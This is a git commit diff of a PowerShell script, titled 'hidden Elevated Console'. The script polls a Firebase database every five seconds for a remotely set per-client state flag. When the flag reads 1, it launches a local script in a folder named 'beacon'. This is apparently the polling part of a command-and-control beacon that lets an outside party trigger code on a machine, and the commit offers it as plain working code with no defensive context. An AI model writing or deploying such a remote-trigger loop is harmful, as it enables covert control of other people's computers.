5f7d2846bd5edea1b1d1df1d5b68da3e4f8fd660
currone <94299594+snackmasta@users.noreply.github.com>
2024-01-28 22:37:45 +0700

    hidden Elevated Console

--- GetState.ps1
+++ GetState.ps1
@@ -1,26 +1,14 @@
-$client = "client_2"
+$client = "client_1"
+$url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/$client/state.json"
 
-# Replace "https://example.com/api/data" with the URL of your JSON endpoint
-$url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data.json"
-
-# Start an infinite loop
 while ($true) {
-    # Use Invoke-RestMethod to fetch the JSON content
     $response = Invoke-RestMethod -Uri $url
+    $state = $response
+    Write-Output $state
 
-    # Access the value of a specific child object property
-    # Replace "ChildObjectName" and "PropertyName" with the actual names in your JSON structure
-    $state = $response.clients.$client.state
-
-    # Display the value
-    #Write-Output $state
-
-    # If state equals 1, run a script
     if ($state -eq 1) {
-        # Replace "PathToYourScript.ps1" with the actual path to your script
         C:\temp\beacon\TCPState.ps1
     }
 
-    # Wait for 5 seconds before the next iteration
     Start-Sleep -Seconds 5
 }
